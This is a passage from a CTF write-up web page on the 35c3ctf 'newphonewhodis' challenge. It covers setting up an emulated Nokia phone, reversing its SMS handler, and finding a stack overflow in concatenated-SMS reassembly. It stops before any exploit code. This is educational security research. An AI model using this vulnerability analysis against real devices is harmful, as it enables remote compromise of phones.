<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>newphonewhodis - 35c3ctf &#183; mhackeroni</title><meta name=title content="newphonewhodis - 35c3ctf &#183; mhackeroni"><meta name=description content="Write-up for the newphonewhodis challenge from 35c3ctf."><meta name=keywords content="35c3,ctf,nokia,gsm,pwn,sms,mhackeroni,"><link rel=canonical href=https://mhackeroni.it/writeups/2018-12-30-35c3ctf-newphonewhodis/><link type=text/css rel=stylesheet href=/css/main.bundle.min.1d8c7618f0ef6623fd6ebffc2988f58f128a919c43d2ed5d99a0621768c50d3ec37bd1e02b3eb119ba92bc64d53422281addaaa107a57202376dbd6a14e2e50e.css integrity="sha512-HYx2GPDvZiP9br/8KYj1jxKKkZxD0u1dmaBiF2jFDT7De9HgKz6xGbqSvGTVNCIoGt2qoQelcgI3bb1qFOLlDg=="><script type=text/javascript src=/js/appearance.min.2a7f28406ff67c2e3fedcfa49ff1dc78cca5f4b2ace4618a279f94d3fd241566af610abcf38bb98ec3f039afc0acbb3c27e9eced17e4a072f1a98e18a628ec7e.js integrity="sha512-Kn8oQG/2fC4/7c+kn/HceMyl9LKs5GGKJ5+U0/0kFWavYQq884u5jsPwOa/ArLs8J+ns7RfkoHLxqY4Ypijsfg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.a187118b41a60744310065c567365de85730c8495301d0ebae41810cc6f7a47432b1de7d4f3b11338959f1ac50c266be6b4b73acf6bf770016eb59b602cc1aa0.js integrity="sha512-oYcRi0GmB0QxAGXFZzZd6FcwyElTAdDrrkGBDMb3pHQysd59TzsRM4lZ8axQwma+a0tzrPa/dwAW61m2AswaoA==" data-copy=Copy data-copied=Copied></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://mhackeroni.it/writeups/2018-12-30-35c3ctf-newphonewhodis/"><meta property="og:site_name" content="mhackeroni"><meta property="og:title" content="newphonewhodis - 35c3ctf"><meta property="og:description" content="Write-up for the newphonewhodis challenge from 35c3ctf."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2018-12-30T00:00:00+00:00"><meta property="article:modified_time" content="2018-12-30T00:00:00+00:00"><meta property="article:tag" content="35c3"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Nokia"><meta property="article:tag" content="Gsm"><meta property="article:tag" content="Pwn"><meta property="article:tag" content="Sms"><meta name=twitter:card content="summary"><meta name=twitter:title content="newphonewhodis - 35c3ctf"><meta name=twitter:description content="Write-up for the newphonewhodis challenge from 35c3ctf."><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"","name":"newphonewhodis - 35c3ctf","headline":"newphonewhodis - 35c3ctf","description":"Write-up for the newphonewhodis challenge from 35c3ctf.","inLanguage":"en","url":"https:\/\/mhackeroni.it\/writeups\/2018-12-30-35c3ctf-newphonewhodis\/","author":{"@type":"Person","name":"mhackeroni"},"copyrightYear":"2018","dateCreated":"2018-12-30T00:00:00\u002b00:00","datePublished":"2018-12-30T00:00:00\u002b00:00","dateModified":"2018-12-30T00:00:00\u002b00:00","keywords":["35c3","ctf","nokia","gsm","pwn","sms","mhackeroni"],"mainEntityOfPage":"true","wordCount":"3369"}]</script><meta name=author content="mhackeroni"><link href=https://bsky.app/profile/mhackeroni.bsky.social rel=me><link href=https://www.facebook.com/mhackeroni rel=me><link href=https://github.com/mhackeroni/ rel=me><link href=https://www.linkedin.com/company/mhackeroni-inc/ rel=me><link href=https://x.com/mhackeroni rel=me><link href=https://www.youtube.com/@mhackeroni rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a></div><div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0"><div><a href=/ class=flex><span class=sr-only>mhackeroni</span>
<img src=/mhackeroni-stylized-square.webp width=1024 height=1024 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt=mhackeroni></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">mhackeroni</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>News</p></a><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Writeups</p></a><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Sponsors>Sponsors</p></a><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title="ðŸ“·  Photo Gallery">Gallery</p></a><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title></p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>News</p></a></li><li class=mt-1><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Writeups</p></a></li><li class=mt-1><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Sponsors>Sponsors</p></a></li><li class=mt-1><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title="ðŸ“·  Photo Gallery">Gallery</p></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title></p></a></li></ul></div></div></div></div><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">newphonewhodis - 35c3ctf</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2018-12-30T00:00:00+00:00>30 December 2018</time><span class="px-2 text-primary-500">&#183;</span><span>3369 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">16 mins</span></div></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><div class="lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl">Author: jinblack</div><blockquote><p>Remember the Nokia 1337 from 31C3? This time we have a <a href=%7b%7b%22https://35c3ctf.ccc.ac/uploads/newphonewhodis-d444f7d98b15ff9c67c99884e1657024ed840cca.tar.gz><code>real target</code></a> for you!</p></blockquote><h3 class="relative group">Challenge note<div id=challenge-note class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#challenge-note aria-label=Anchor>#</a></span></h3><p>Note: There is a giant readme in the provided archive. Make sure you read it and try everything locally first. After you have your exploit, launch it against the remote infrastructure and get to the real meat!</p><p>Note 2: The UI crashes when you select a phone book entry and select &ldquo;Options&rdquo;. This is not intended and an oversight by the author but isn&rsquo;t relevant to the solution to the challenge. So just don&rsquo;t hit that button.</p><p>Hints:
To avoid confusion: The target phone can reach external hosts on the internet and has netcat installed.</p><h2 class="relative group">Where do we begin?<div id=where-do-we-begin class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#where-do-we-begin aria-label=Anchor>#</a></span></h2><p>There is a phone running somewhere at the 35c3 convention. It is connected to a GSM network. But there is no radio connection for the physical layer, instead, all the GSM protocol run over UDP packets that are sent through an OpenVPN connection.</p><p>I ran the <code>buildall</code> script, it took a while (I was in the South of Italy visiting my parents, here internet connection is far from good).
I ran the <code>startall</code> script and only two containers out of 3 came up. One container was the <code>baseband</code>. another one was an <code>osmocombb</code> instance with 2 configured phone, and the third one, the one who did not come up, the one that really matters was an emulator for the Nokia phone.</p><h3 class="relative group">Inside the nokia phone<div id=inside-the-nokia-phone class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#inside-the-nokia-phone aria-label=Anchor>#</a></span></h3><p><code>nokia_qemu</code> container is dying just after the start, but this does not stop us from getting inside and find our binary.
the container as an <code>image</code> folder and inside that we have <code>nokia-image-nokia.ext4</code>. This is the filesystem of our phone. We can mount this and take a look.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo mount ./nokia-image-nokia.ext4 /mnt
</span></span></code></pre></div><p>There is a <code>/flag.txt</code> file containing:</p><pre tabindex=0><code>If this was the real challenge, you would find the flag here.
</code></pre><p>So we at least know where is the flag.
Inside <code>/opt/nokia</code> we have 3 arm32 binaries: <code>baseband</code> <code>layer1</code> <code>nokia_ui</code>. So, we probably need to remotely pwn one of those binaries and read the flag.</p><h3 class="relative group">Running the nokia phone<div id=running-the-nokia-phone class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#running-the-nokia-phone aria-label=Anchor>#</a></span></h3><p>We definitely need to have a running setup if we want to have any chance of pwning this.
So we need to figure out why our docker container is not working.
To be honest inside the readme there where some hint on how to run the container. But at that time I was not aware enough of the challenge set up to actually understand that.
The Nokia phone is running inside a qemu that is inside the docker container.
The problem was that it was not able to connect to x11 server to actually render stuff.</p><p>My solution was to change the <code>-display sdl</code> into <code>-vnc :0</code> from the <code>runqemu.sh</code>.</p><p>This enables a vnc server that you need to expose outside the container to actually have access to it.
So you need to add a <code>-p 5900:5900</code> to you docker running command inside the <code>run.sh</code> script.</p><p>Then we can connect to the screen using <code>vinagre</code> a vnc client.</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=server srcset="/img/newphonewhodis_writeup/vncphone_hu_82aee5eceafc02ea.png 330w,
/img/newphonewhodis_writeup/vncphone_hu_11ec5549caabdfcd.png 660w,
/img/newphonewhodis_writeup/vncphone_hu_d86a5512927eff2.png 1280w" data-zoom-src=/img/newphonewhodis_writeup/vncphone.png src=/img/newphonewhodis_writeup/vncphone.png></figure></p><p>When the nokia is running you can also connect through ssh as explained by the <code>runall.sh</code> script.</p><p>Running <code>ps</code> we can actually confirm that those binaries that we found are actually running on the phone.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> <span class=m>1172</span> root      <span class=m>6924</span> S    /opt/nokia/nokia_ui
</span></span><span class=line><span class=cl> <span class=m>1173</span> root      <span class=m>1564</span> S    /sbin/agetty -8 -L ttyAMA0 <span class=m>115200</span> xterm
</span></span><span class=line><span class=cl> <span class=m>1174</span> root      <span class=m>4944</span> S    /usr/sbin/openvpn --daemon --writepid /var/run/openvpn/gsm.pid --cd /etc/open
</span></span><span class=line><span class=cl> <span class=m>1205</span> root      <span class=m>5852</span> S    /opt/nokia/layer1
</span></span><span class=line><span class=cl> <span class=m>1206</span> root      <span class=m>6124</span> S    /opt/nokia/baseband
</span></span><span class=line><span class=cl> <span class=m>1209</span> root      <span class=m>2108</span> S    /usr/sbin/dropbear -i -r /etc/dropbear/dropbear_rsa_host_key -B
</span></span></code></pre></div><h2 class="relative group">Reversing the binary nokia_ui<div id=reversing-the-binary-nokia_ui class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#reversing-the-binary-nokia_ui aria-label=Anchor>#</a></span></h2><p>Opening the binary with ida you actually understand that most of the code is in thumb mode. But my ida fails to identify the code like that. You can use <code>Alt+G</code> to change the flag <code>T</code> to let ida know that a segment is actually in thumb mode.</p><p>Playing with the phone you can notice that only 2 main functionalities are implemented inside the phone.</p><ul><li>Phonebook</li><li>SMS</li></ul><p>So this phone cannot do voice call. Can only send and receive SMSes. Then we need to find where those SMSes are actually handled.</p><p>Around address <code>0x12E82</code> we see this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>   <span class=k>if</span> <span class=p>(</span> <span class=n>v49</span> <span class=o>==</span> <span class=mh>0x202</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>v51</span> <span class=o>=</span> <span class=nf>osmo_hexdump</span><span class=p>(</span><span class=n>recvstuff</span> <span class=o>+</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mi>163</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Received SMS TPDU: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>v51</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>recv_sms</span><span class=p>(</span><span class=n>v44</span><span class=p>,</span> <span class=n>recvstuff</span><span class=p>[</span><span class=mi>16</span><span class=p>],</span> <span class=n>recvstuff</span> <span class=o>+</span> <span class=mh>0x11</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>JUMPOUT</span><span class=p>(</span><span class=n>__CS__</span><span class=p>,</span> <span class=n>v12</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>v49</span> <span class=o>==</span> <span class=mi>515</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Received SMS confirmation: msg_ref: %u - cause: %u</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>recvstuff</span><span class=p>[</span><span class=mi>180</span><span class=p>],</span> <span class=o>*</span><span class=p>(</span><span class=n>recvstuff</span> <span class=o>+</span> <span class=mi>46</span><span class=p>));</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>recvstuff</span><span class=p>[</span><span class=mi>181</span><span class=p>]</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>sub_13388</span><span class=p>(</span><span class=n>v44</span><span class=p>,</span> <span class=n>recvstuff</span><span class=p>[</span><span class=mi>180</span><span class=p>],</span> <span class=o>*</span><span class=p>(</span><span class=n>recvstuff</span> <span class=o>+</span> <span class=mi>46</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>v49</span> <span class=o>==</span> <span class=mi>258</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Shutdown indication: Old state: %u - New State: %u</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=p>(</span><span class=n>recvstuff</span> <span class=o>+</span> <span class=mi>2</span><span class=p>),</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=n>recvstuff</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span><span class=p>));</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=o>*</span><span class=p>(</span><span class=n>recvstuff</span> <span class=o>+</span> <span class=mi>5</span><span class=p>)</span> <span class=o>==</span> <span class=mi>3</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=p>(</span><span class=n>v44</span> <span class=o>+</span> <span class=mi>60</span><span class=p>)</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=nf>JUMPOUT</span><span class=p>(</span><span class=n>__CS__</span><span class=p>,</span> <span class=n>v12</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>LABEL_20</span><span class=p>;</span>
</span></span></code></pre></div><p>The <code>Received SMS TPDU</code> gives away the fact that the next function is probably where SMS is interpreted.</p><p>Here is the decompiled source from <a href=/code/newphonewhodis_writeup/recv_sms.c><code>recv_sms</code></a>.</p><p>There is basically 2 way of receiving SMS:</p><ul><li>Normal SMS</li><li>Multi-Part SMS (Concatenated SMS)</li></ul><p>To have a multi-part SMS you need to insert inside the SMS payload a User Data Header (<a href=%7b%7b%22https://en.wikipedia.org/wiki/User_Data_Header#UDH_Information_Elements><code>UDH</code></a>).
You can read the standard but this stuff is well known and can also be found on Wikipedia <a href=%7b%7b%22https://en.wikipedia.org/wiki/Concatenated_SMS><code>Concatenated SMS</code></a>.</p><p>Looking at the Wikipedia page we can compare the standard header for multi-part SMS with this code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Received SMS with UDH&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>userbuf</span><span class=o>-&gt;</span><span class=n>encoded_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Got unknown information element in UDH: 0x%02x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>userbuf</span><span class=o>-&gt;</span><span class=n>encoded_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>FAIL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>userbuf</span><span class=o>-&gt;</span><span class=n>encoded_data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>5</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Concatenated SMS UDH with length != 5?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nl>FAIL</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Received SMS with malformed/unknown UDH. Discarding...&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nf>talloc_free</span><span class=p>(</span><span class=n>userbuf</span><span class=p>,</span> <span class=mi>115284</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>LABEL_33</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>userbuf</span><span class=o>-&gt;</span><span class=n>encoded_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>3</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Concatenated SMS UDH with header length != 3?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>FAIL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>nparts</span> <span class=o>=</span> <span class=n>userbuf</span><span class=o>-&gt;</span><span class=n>encoded_data</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>nparts</span> <span class=o>&gt;</span> <span class=mi>3</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Too many parts&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>FAIL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>refnum</span> <span class=o>=</span> <span class=n>userbuf</span><span class=o>-&gt;</span><span class=n>encoded_data</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>seqnum</span> <span class=o>=</span> <span class=n>userbuf</span><span class=o>-&gt;</span><span class=n>encoded_data</span><span class=p>[</span><span class=mi>5</span><span class=p>];</span>
</span></span></code></pre></div><p>We know that the binary is using the standard UDH format. We can give a name to all those bytes that the program is parsing.</p><p>So basically when you send a multipart SMS you add this header where you write a <code>refnum</code> or <code>CSMS</code> that is a unique id to identify the sequence of SMSes. You have a <code>nparts</code> or number of parts that are expected for that SMS. And the most important <code>seqnum</code> a number that says which part of SMS you are handling (2 means this is the second piece of the SMS).</p><p>We also notice that we cannot have SMSes that are bigger than 3 parts.</p><h2 class="relative group">The Vulnerability<div id=the-vulnerability class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-vulnerability aria-label=Anchor>#</a></span></h2><p>After a while playing ctfs you know that if the author spent the time to implement the multi-part SMS protocol that stuff is needed for the attack.</p><p>Where multi-part SMSes are actually processed we find this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v55</span> <span class=o>||</span> <span class=n>v55</span> <span class=o>&gt;</span> <span class=mi>3</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Unknown data coding scheme in sms. Copying raw data after UDH&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>              <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;8 bit encoding&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>              <span class=n>v49</span> <span class=o>=</span> <span class=mi>134</span><span class=p>;</span>
</span></span><span class=line><span class=cl>              <span class=n>v50</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>v47</span><span class=o>-&gt;</span><span class=n>data</span> <span class=o>+</span> <span class=mi>28</span><span class=p>);</span>
</span></span><span class=line><span class=cl>              <span class=k>if</span> <span class=p>(</span> <span class=n>v50</span> <span class=o>&lt;=</span> <span class=mh>0x8C</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>v49</span> <span class=o>=</span> <span class=n>v50</span> <span class=o>-</span> <span class=mi>6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>              <span class=nf>memcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>payload</span><span class=p>[</span><span class=mi>134</span> <span class=o>*</span> <span class=n>seqnum</span> <span class=o>-</span> <span class=mi>134</span><span class=p>],</span> <span class=p>(</span><span class=n>v47</span><span class=o>-&gt;</span><span class=n>data</span> <span class=o>+</span> <span class=mi>35</span><span class=p>),</span> <span class=n>v49</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span></code></pre></div><p>This code is actually reconstructing the SMS from all its parties. Copying the result inside <code>payload</code> a variable on the stack.
